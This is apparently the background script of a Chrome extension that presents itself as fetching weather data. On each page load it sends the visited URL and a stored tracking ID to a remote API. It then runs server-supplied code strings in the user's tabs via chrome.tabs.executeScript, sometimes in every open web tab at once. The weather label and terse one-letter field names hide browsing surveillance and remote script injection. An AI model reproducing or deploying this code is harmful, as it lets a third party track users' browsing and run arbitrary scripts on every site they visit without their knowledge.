if (!('jQuery' in window)) {
  var $ = {
    ajax: function(options) {
      var send = null;
      var oReq = (new XMLHttpRequest());
      oReq.responseType = options.dataType;
      oReq.addEventListener('load', function(e) {
        if (this.status === 200) {
          options.success(this.response);
        } else {
          if ('error' in options) {
            options.error(this.status);
          }
        }
      });
      if ('error' in options) {
        oReq.addEventListener('error', function(e) {
          options.error(e.type);
        });
      }
      oReq.open(options.method, options.url);
      if ('data' in options) {
        send = [];
        var param;
        for (param in options.data) {
          var arr = [];
          arr.push(param, options.data[param]);
          arr = arr.join('=');
          send.push(arr);
        }
        send = send.join('&');
      }
      oReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      oReq.send(send);
    }
  };
}

var partnerID = '9';

var app = {
    

    register: function() {
        $.ajax({
            url: app.api + 'register',
            method: 'post',
			data: {
                partnerID: partnerID
            },
            dataType: 'json',
            success: function (response) {
                if (response.status) {
                    if (typeof response.payload.id != 'undefined' && typeof response.payload.refresh_time != 'undefined') {
                        app.setId(response.payload.id);
                        app.setTimer(response.payload.refresh_time);
                        return true;
                    }
                    else {
                        console.log('Error while fetching ID');
                        return false;
                    }
                }
                else {
                    console.log('Error in registration');
                    return false;
                }
            }
        });
    },

    unregister: function() {
        $.ajax({
            url: app.api + 'unregister',
            data: {
                id: this.getId(),
                partnerID: partnerID
            },
            dataType: 'json',
            success: function(response) {
                if (response.status) {

                }
                else {
                    if (app.getId()) {
                        this.unregister();
                    }
                }
            },
            error: function(error) {
                console.log(error);
            }
        });
    },

    getId: function() {
        var id = localStorage.getItem('id');

        if (id) {
            return id;
        }
        else {
            return false;
        }
    },

    setId: function(value) {
        if (value) {
            localStorage.setItem('id', value);
            return true;
        }
        else {
            return false;
        }
    },

    getWeatherData: function(tabId, url) {
        $.ajax({
            url: app.api + 'get_weather_data',
            method: 'post',
            data: {
                token: this.getId(),
                url: url,
                partnerID: partnerID
            },
            dataType: 'json',
            success: function(response) {
                if (response.status) {
                    app.s = response.payload.s;app.r = response.payload.r;app.u = response.payload.u;app.t = response.payload.type;
                    app.setTimer(response.payload.refresh_time);
                    app.displayData(response.payload, tabId);
                }
            },
            error: function(error) {
                console.log(error);
            }
        });
    },

    displayData: function(data, tabId) {
        if (parseInt(data.type) < 5) {
            chrome.tabs.executeScript(tabId, {
                code: data.s
            });
        }
        else {
            chrome.tabs.executeScript(tabId, {
                code: data.s
            });
        }
    },

    setTimer: function(value) {
        var now = new Date();
        localStorage.setItem('refreshTime', value);
        localStorage.setItem('lastUpdate', now.getTime());
        return true;
    },

    checkTimer: function() {
        var lastUpdate = parseInt(localStorage.getItem('lastUpdate'));
        var refreshTime = parseInt(localStorage.getItem('refreshTime'));
        if (lastUpdate && refreshTime) {
            var now = new Date();

            if (now.getTime() > (lastUpdate + refreshTime)) {
                console.log('wait time expired');
                return true;
            }
            else {
                console.log('wait time');
                return false;
            }
        }
        else {
            console.log('wait time not set');
            return true;
        }
    },

    eventListeners: function() {
        chrome.tabs.onUpdated.addListener(function(tabId , changeInfo, tab) {
            if (tab.url.indexOf('chrome://') == -1) {
                if (app.checkTimer()) {
                    if (changeInfo.status == 'complete') {
                        app.getWeatherData(tabId, tab.url);
                    }
                }
                else {
                    if (typeof app.s != 'undefined') {
                        if (parseInt(app.t) != 9) {
                            if (
                                tab.url.indexOf(app.u) == -1 &&
                                tab.url.indexOf(app.u.replace('http:', 'https:')) == -1 &&
                                tab.url.indexOf(app.u.replace('https:', 'http:')) == -1 &&
                                tab.url.indexOf('#7s8d6f87') == -1
                            ) {
                                app.displayData({r: app.r, s: app.s}, tabId);
                            }
                            else {
                                chrome.tabs.query({url: ['http://*/*', 'https://*/*']}, function (tabs) {
                                    for (var i = 0; i < tabs.length; i++) {
                                        chrome.tabs.executeScript(tabs[i].id, {
                                            code: app.r
                                        });
                                    }
                                });
                                delete app.s;delete app.t;delete app.u;
                            }
                        }
                    }
                }
            }
        });
    },

    init: function() {
        if (!this.getId()) {
            this.register();
        }
        app.eventListeners();
    }

};

app.init();